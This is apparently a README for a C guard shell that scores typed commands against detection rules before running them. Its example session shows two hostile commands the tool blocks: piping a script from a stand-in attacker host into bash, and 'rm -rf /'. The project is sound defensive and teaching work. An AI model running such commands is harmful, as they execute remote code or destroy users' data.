# Suspicious Command Detector (SCD)

A system programming project that implements an **interactive guard shell** in C. It intercepts every command you type, analyzes it against detection rules, gives a suspicion rating with reasons, and asks for confirmation before executing dangerous commands.

## System Programming Concepts Demonstrated

| Concept | Where |
|---------|-------|
| **Process Creation** | `fork()` — spawns child for each command |
| **Program Execution** | `execvp()` — replaces child with `/bin/sh -c <cmd>` |
| **Process Synchronization** | `waitpid()`, `WIFEXITED`, `WEXITSTATUS` |
| **Inter-Process Communication** | `pipe()` — parent/child notification |
| **Signal Handling** | `signal(SIGINT, SIG_IGN)` — monitor ignores Ctrl-C |
| **File I/O** | `fopen`/`fgets` — rule config loading |
| **POSIX Regex** | `regcomp`/`regexec` — pattern matching |
| **Shell Parsing** | Tokenizer handles pipes, redirects, quotes, subshells |

## Quick Start

```bash
make
./scd
```

That's it. Two commands.

## How It Works

```
┌─────────────────────────────────────────────────────┐
│  User types command                                  │
│         ↓                                           │
│  Parser tokenizes (pipes, redirects, quotes...)     │
│         ↓                                           │
│  Rule Engine matches against 80+ detection rules    │
│         ↓                                           │
│  Scorer calculates risk (0-100)                     │
│         ↓                                           │
│  If score < 20: ✓ Clean → execute via fork/exec    │
│  If score ≥ 20: ⚠ Warn → show reasons → ask y/n   │
│         ↓                                           │
│  Execute (fork → pipe → exec → waitpid) or Block   │
└─────────────────────────────────────────────────────┘
```

## Example Session

```
user@scd:~ $ ls -la
  ✓ Clean (score: 0)
total 48
drwxr-xr-x  12 user  staff   384 May 19 10:00 .
...

user@scd:~ $ curl http://evil.com/x.sh | bash
------------------------------------------------------------
  ⚠  DANGEROUS  (Score: 70/100)
  Risk: [##############------] 70%
------------------------------------------------------------
  Command: curl http://evil.com/x.sh | bash
  Reasons:
    [R-04] HIGH     → RCE: curl piped to shell
------------------------------------------------------------

  Run this DANGEROUS command? [y/N]: n
  ✗ Command blocked by SCD.

user@scd:~ $ rm -rf /
------------------------------------------------------------
  ⚠  DANGEROUS  (Score: 100/100)
  Risk: [####################] 100%
------------------------------------------------------------
  Command: rm -rf /
  Reasons:
    [R-02] CRITICAL → Recursive deletion of root filesystem
------------------------------------------------------------

  Run this DANGEROUS command? [y/N]: n
  ✗ Command blocked by SCD.
```

## Project Structure

```
├── Makefile              # Build system (just run 'make')
├── config/
│   ├── rules.conf        # 80+ detection rules (ID|RISK|PATTERN|DESCRIPTION)
│   └── whitelist.conf    # Commands to skip (optional)
├── include/
│   └── scd.h            # Shared types & definitions
├── src/
│   ├── main.c           # Entry point + interactive shell loop + fork/exec
│   ├── parser.c         # Shell command tokenizer
│   ├── rule_engine.c    # Rule loader + pattern matcher (substring & regex)
│   └── scorer.c         # Risk score calculator
└── tests/
    ├── sample_clean.txt     # Safe commands for testing
    └── sample_malicious.txt # Dangerous commands for testing
```

## Adding Custom Rules

Edit `config/rules.conf`:

```
# Format: ID|RISK|PATTERN|DESCRIPTION
MY-01|HIGH|dangerous_command|My custom detection rule
MY-02|CRITICAL|regex:some.*pattern|Regex-based detection
```

Risk levels: `LOW` (15pts), `MEDIUM` (40pts), `HIGH` (70pts), `CRITICAL` (100pts)

## Requirements

- GCC (or any C11 compiler)
- macOS or Linux
- That's it. No external libraries.
